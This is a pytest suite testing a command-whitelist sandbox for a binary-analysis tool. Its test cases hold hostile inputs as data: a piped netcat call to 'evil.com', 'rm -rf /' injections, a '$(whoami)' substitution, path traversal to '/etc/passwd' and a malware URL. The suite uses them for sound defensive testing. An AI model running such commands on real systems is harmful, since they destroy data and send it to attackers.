"""
Security Test Suite for Command Whitelist Hardening

This test suite validates the hardened command whitelist implementation
in secure_subprocess.py to ensure:
1. Dangerous executables (python, docker) are blocked
2. Argument validation prevents abuse of allowed tools
3. Network access flags are blocked
4. Malicious argument injection is prevented
5. Legitimate use cases still work

Author: KP14 Security Team
Version: 1.0.0
Security Level: CRITICAL
"""

import pytest
import logging
from pathlib import Path
import tempfile
import os

from core_engine.secure_subprocess import (
    SecureSubprocess,
    ALLOWED_EXECUTABLES,
    ALLOWED_ARGS_PATTERNS,
    secure_run,
)
from core_engine.error_handler import SecurityError


# Test fixtures
@pytest.fixture
def secure_subprocess():
    """Create a SecureSubprocess instance for testing."""
    return SecureSubprocess(enable_sandboxing=False)


@pytest.fixture
def temp_test_file():
    """Create a temporary test file for analysis."""
    with tempfile.NamedTemporaryFile(mode='wb', delete=False, suffix='.bin') as f:
        f.write(b'MZ\x90\x00' + b'\x00' * 1000)  # Minimal PE header
        temp_path = f.name

    yield temp_path

    # Cleanup
    if os.path.exists(temp_path):
        os.unlink(temp_path)


# ============================================================================
# Test 1: Dangerous Executables Blocked
# ============================================================================

class TestDangerousExecutablesBlocked:
    """Test that dangerous executables are removed from whitelist."""

    def test_python_not_in_whitelist(self):
        """Test: python is not in ALLOWED_EXECUTABLES."""
        assert 'python' not in ALLOWED_EXECUTABLES, \
            "CRITICAL: python should be removed from whitelist"

    def test_python3_not_in_whitelist(self):
        """Test: python3 is not in ALLOWED_EXECUTABLES."""
        assert 'python3' not in ALLOWED_EXECUTABLES, \
            "CRITICAL: python3 should be removed from whitelist"

    def test_docker_not_in_whitelist(self):
        """Test: docker is not in ALLOWED_EXECUTABLES."""
        assert 'docker' not in ALLOWED_EXECUTABLES, \
            "CRITICAL: docker should be removed from whitelist"

    def test_python_execution_blocked(self, secure_subprocess):
        """Test: Attempting to execute python is blocked."""
        with pytest.raises(SecurityError) as exc_info:
            secure_subprocess.run(['python', '-c', 'print("pwned")'])

        assert "not allowed" in str(exc_info.value).lower()

    def test_python3_execution_blocked(self, secure_subprocess):
        """Test: Attempting to execute python3 is blocked."""
        with pytest.raises(SecurityError) as exc_info:
            secure_subprocess.run(['python3', '-c', 'print("pwned")'])

        assert "not allowed" in str(exc_info.value).lower()

    def test_docker_execution_blocked(self, secure_subprocess):
        """Test: Attempting to execute docker is blocked."""
        with pytest.raises(SecurityError) as exc_info:
            secure_subprocess.run(['docker', 'run', 'alpine', 'sh'])

        assert "not allowed" in str(exc_info.value).lower()

    def test_ghidra_removed_from_whitelist(self):
        """Test: Ghidra tools removed (can execute scripts)."""
        assert 'ghidra' not in ALLOWED_EXECUTABLES
        assert 'analyzeHeadless' not in ALLOWED_EXECUTABLES

    def test_ida_removed_from_whitelist(self):
        """Test: IDA tools removed (can execute scripts)."""
        assert 'ida' not in ALLOWED_EXECUTABLES
        assert 'ida64' not in ALLOWED_EXECUTABLES


# ============================================================================
# Test 2: Argument Validation for Radare2
# ============================================================================

class TestRadare2ArgumentValidation:
    """Test argument validation for radare2/r2."""

    def test_radare2_network_flag_blocked(self, secure_subprocess, temp_test_file):
        """Test: radare2 -d flag (debug/network) is blocked."""
        with pytest.raises(SecurityError) as exc_info:
            secure_subprocess.run(['radare2', '-d', temp_test_file])

        assert "forbidden" in str(exc_info.value).lower() or "argument" in str(exc_info.value).lower()

    def test_radare2_http_url_blocked(self, secure_subprocess):
        """Test: radare2 with HTTP URL is blocked."""
        with pytest.raises(SecurityError) as exc_info:
            secure_subprocess.run(['radare2', 'http://evil.com/malware.exe'])

        assert "forbidden" in str(exc_info.value).lower() or "argument" in str(exc_info.value).lower()

    def test_radare2_tcp_url_blocked(self, secure_subprocess):
        """Test: radare2 with TCP URL is blocked."""
        with pytest.raises(SecurityError) as exc_info:
            secure_subprocess.run(['radare2', 'tcp://192.168.1.1:9999'])

        assert "forbidden" in str(exc_info.value).lower() or "argument" in str(exc_info.value).lower()

    def test_radare2_shell_command_blocked(self, secure_subprocess, temp_test_file):
        """Test: radare2 with shell command execution is blocked."""
        with pytest.raises(SecurityError) as exc_info:
            secure_subprocess.run(['radare2', '-c', '!rm -rf /', temp_test_file])

        # Should be blocked by forbidden pattern '!'
        assert "forbidden" in str(exc_info.value).lower() or "argument" in str(exc_info.value).lower()

    def test_radare2_too_many_args_blocked(self, secure_subprocess, temp_test_file):
        """Test: radare2 with too many arguments is blocked."""
        # Create command with more than max_args (15)
        too_many_args = ['-q'] * 20

        with pytest.raises(SecurityError) as exc_info:
            secure_subprocess.run(['radare2'] + too_many_args + [temp_test_file])

        assert "too many" in str(exc_info.value).lower() or "argument" in str(exc_info.value).lower()

    def test_radare2_valid_analysis_allowed(self, secure_subprocess, temp_test_file):
        """Test: Valid radare2 analysis commands are allowed (if radare2 is installed)."""
        # This test will be skipped if radare2 is not installed
        # We're testing the validation logic, not the actual execution

        # Test that validation passes (don't actually run it)
        is_valid, error = secure_subprocess._validate_command(['radare2', '-q', '-A', temp_test_file])
        assert is_valid, f"Valid radare2 command should pass validation: {error}"


# ============================================================================
# Test 3: Argument Validation for File Tools
# ============================================================================

class TestFileToolsArgumentValidation:
    """Test argument validation for file analysis tools."""

    def test_file_magic_compile_blocked(self, secure_subprocess, temp_test_file):
        """Test: file -C flag (compile magic) is blocked."""
        with pytest.raises(SecurityError) as exc_info:
            secure_subprocess.run(['file', '-C', temp_test_file])

        assert "forbidden" in str(exc_info.value).lower() or "argument" in str(exc_info.value).lower()

    def test_file_valid_command_allowed(self, secure_subprocess, temp_test_file):
        """Test: Valid file commands pass validation."""
        is_valid, error = secure_subprocess._validate_command(['file', '--brief', temp_test_file])
        assert is_valid, f"Valid file command should pass validation: {error}"

    def test_strings_valid_command_allowed(self, secure_subprocess, temp_test_file):
        """Test: Valid strings commands pass validation."""
        is_valid, error = secure_subprocess._validate_command(['strings', '-a', temp_test_file])
        assert is_valid, f"Valid strings command should pass validation: {error}"

    def test_xxd_reverse_blocked(self, secure_subprocess, temp_test_file):
        """Test: xxd -r flag (reverse/write) is blocked."""
        with pytest.raises(SecurityError) as exc_info:
            secure_subprocess.run(['xxd', '-r', temp_test_file])

        assert "forbidden" in str(exc_info.value).lower() or "argument" in str(exc_info.value).lower()

    def test_xxd_valid_command_allowed(self, secure_subprocess, temp_test_file):
        """Test: Valid xxd commands pass validation."""
        is_valid, error = secure_subprocess._validate_command(['xxd', '-l', '100', temp_test_file])
        assert is_valid, f"Valid xxd command should pass validation: {error}"


# ============================================================================
# Test 4: Argument Validation for Archive Tools
# ============================================================================

class TestArchiveToolsArgumentValidation:
    """Test argument validation for archive tools."""

    def test_unzip_overwrite_flag_blocked(self, secure_subprocess):
        """Test: unzip -o flag (overwrite) is blocked."""
        with pytest.raises(SecurityError) as exc_info:
            secure_subprocess.run(['unzip', '-o', 'test.zip'])

        assert "forbidden" in str(exc_info.value).lower() or "argument" in str(exc_info.value).lower()

    def test_unzip_path_traversal_blocked(self, secure_subprocess):
        """Test: unzip with path traversal is blocked."""
        with pytest.raises(SecurityError) as exc_info:
            secure_subprocess.run(['unzip', '../../../etc/passwd.zip'])

        assert "forbidden" in str(exc_info.value).lower() or "argument" in str(exc_info.value).lower()

    def test_unzip_valid_command_allowed(self, secure_subprocess):
        """Test: Valid unzip commands pass validation."""
        is_valid, error = secure_subprocess._validate_command(['unzip', '-l', 'test.zip'])
        assert is_valid, f"Valid unzip command should pass validation: {error}"

    def test_tar_absolute_names_blocked(self, secure_subprocess):
        """Test: tar --absolute-names is blocked."""
        with pytest.raises(SecurityError) as exc_info:
            secure_subprocess.run(['tar', '--absolute-names', '-xf', 'test.tar'])

        assert "forbidden" in str(exc_info.value).lower() or "argument" in str(exc_info.value).lower()

    def test_tar_valid_command_allowed(self, secure_subprocess):
        """Test: Valid tar commands pass validation."""
        is_valid, error = secure_subprocess._validate_command(['tar', '-tzf', 'test.tar.gz'])
        assert is_valid, f"Valid tar command should pass validation: {error}"


# ============================================================================
# Test 5: Argument Validation for Crypto Tools
# ============================================================================

class TestCryptoToolsArgumentValidation:
    """Test argument validation for OpenSSL."""

    def test_openssl_genrsa_blocked(self, secure_subprocess):
        """Test: openssl genrsa (key generation) is blocked."""
        with pytest.raises(SecurityError) as exc_info:
            secure_subprocess.run(['openssl', 'genrsa', '-out', 'key.pem'])

        assert "forbidden" in str(exc_info.value).lower() or "argument" in str(exc_info.value).lower()

    def test_openssl_valid_digest_allowed(self, secure_subprocess):
        """Test: Valid openssl digest commands pass validation."""
        is_valid, error = secure_subprocess._validate_command(['openssl', 'dgst', '-sha256'])
        assert is_valid, f"Valid openssl command should pass validation: {error}"


# ============================================================================
# Test 6: Malicious Injection Attempts
# ============================================================================

class TestMaliciousInjectionPrevention:
    """Test prevention of malicious argument injection."""

    def test_command_substitution_blocked(self, secure_subprocess):
        """Test: Command substitution attempts are blocked."""
        # This should be blocked by CommandValidator
        with pytest.raises(SecurityError) as exc_info:
            secure_subprocess.run(['strings', '$(whoami)'])

        assert "validation failed" in str(exc_info.value).lower()

    def test_pipe_injection_blocked(self, secure_subprocess, temp_test_file):
        """Test: Pipe injection attempts are blocked."""
        with pytest.raises(SecurityError) as exc_info:
            secure_subprocess.run(['file', temp_test_file + '|nc evil.com 1337'])

        assert "validation failed" in str(exc_info.value).lower()

    def test_semicolon_injection_blocked(self, secure_subprocess, temp_test_file):
        """Test: Semicolon injection attempts are blocked."""
        with pytest.raises(SecurityError) as exc_info:
            secure_subprocess.run(['strings', temp_test_file + ';rm -rf /'])

        assert "validation failed" in str(exc_info.value).lower()


# ============================================================================
# Test 7: Argument Pattern Configuration
# ============================================================================

class TestArgumentPatternConfiguration:
    """Test that all whitelisted executables have argument patterns."""

    def test_all_executables_have_patterns(self):
        """Test: All ALLOWED_EXECUTABLES have ALLOWED_ARGS_PATTERNS."""
        for executable in ALLOWED_EXECUTABLES:
            assert executable in ALLOWED_ARGS_PATTERNS, \
                f"Executable '{executable}' in whitelist but missing argument validation patterns"

    def test_all_patterns_have_required_fields(self):
        """Test: All patterns have required fields."""
        required_fields = ['allowed_flags', 'forbidden_patterns', 'max_args']

        for executable, pattern in ALLOWED_ARGS_PATTERNS.items():
            for field in required_fields:
                assert field in pattern, \
                    f"Pattern for '{executable}' missing required field '{field}'"

    def test_max_args_reasonable(self):
        """Test: max_args values are reasonable."""
        for executable, pattern in ALLOWED_ARGS_PATTERNS.items():
            # Sandbox tools can have more args, others should be limited
            if executable in ['firejail', 'bubblewrap']:
                assert pattern['max_args'] <= 50, \
                    f"max_args for {executable} is too high"
            else:
                assert pattern['max_args'] <= 20, \
                    f"max_args for {executable} is too high"


# ============================================================================
# Test 8: Security Audit Logging
# ============================================================================

class TestSecurityAuditLogging:
    """Test that security events are properly logged."""

    def test_blocked_command_logged(self, secure_subprocess, caplog):
        """Test: Blocked commands are logged with SECURITY marker."""
        with caplog.at_level(logging.ERROR):
            with pytest.raises(SecurityError):
                secure_subprocess.run(['python', '-c', 'print("test")'])

        # Check that security log entry was created
        security_logs = [record for record in caplog.records if 'SECURITY' in record.message]
        assert len(security_logs) > 0, "Blocked command should generate SECURITY log entry"

    def test_blocked_argument_logged(self, secure_subprocess, temp_test_file, caplog):
        """Test: Blocked arguments are logged."""
        with caplog.at_level(logging.ERROR):
            with pytest.raises(SecurityError):
                secure_subprocess.run(['radare2', '-d', temp_test_file])

        # Check that argument validation failure was logged
        log_messages = [record.message for record in caplog.records]
        assert any('argument' in msg.lower() or 'forbidden' in msg.lower()
                  for msg in log_messages), \
            "Argument validation failure should be logged"


# ============================================================================
# Test 9: Integration Tests
# ============================================================================

class TestSecureSubprocessIntegration:
    """Integration tests for complete workflows."""

    def test_safe_file_analysis_workflow(self, secure_subprocess, temp_test_file):
        """Test: Complete safe file analysis workflow passes validation."""
        # These should all pass validation
        commands = [
            ['file', '--brief', temp_test_file],
            ['strings', '-a', temp_test_file],
            ['xxd', '-l', '100', temp_test_file],
        ]

        for cmd in commands:
            is_valid, error = secure_subprocess._validate_command(cmd)
            assert is_valid, f"Safe command {cmd} should pass: {error}"

    def test_no_executable_bypass(self, secure_subprocess):
        """Test: Cannot bypass whitelist with path tricks."""
        bypass_attempts = [
            ['/usr/bin/python', '-c', 'print("test")'],
            ['./python', '-c', 'print("test")'],
            ['../../../usr/bin/python', '-c', 'print("test")'],
        ]

        for cmd in bypass_attempts:
            with pytest.raises(SecurityError):
                secure_subprocess.run(cmd)


# ============================================================================
# Test 10: Regression Tests
# ============================================================================

class TestRegressionTests:
    """Regression tests to ensure fixes don't break legitimate use cases."""

    def test_file_arg_requirement_enforced(self, secure_subprocess):
        """Test: Commands requiring file args are validated."""
        # strings requires a file argument
        with pytest.raises(SecurityError) as exc_info:
            secure_subprocess.run(['strings', '-a'])

        assert "file argument required" in str(exc_info.value).lower() or \
               "argument" in str(exc_info.value).lower()

    def test_flag_with_equals_handled(self, secure_subprocess):
        """Test: Flags with = are handled correctly (e.g., --flag=value)."""
        # This should parse correctly
        is_valid, error = secure_subprocess._validate_command(
            ['tar', '-C=/tmp', '-xf', 'test.tar']
        )
        # May fail for other reasons, but should handle the = parsing
        assert error == "" or "argument" not in error.lower() or is_valid


if __name__ == '__main__':
    pytest.main([__file__, '-v', '--tb=short'])
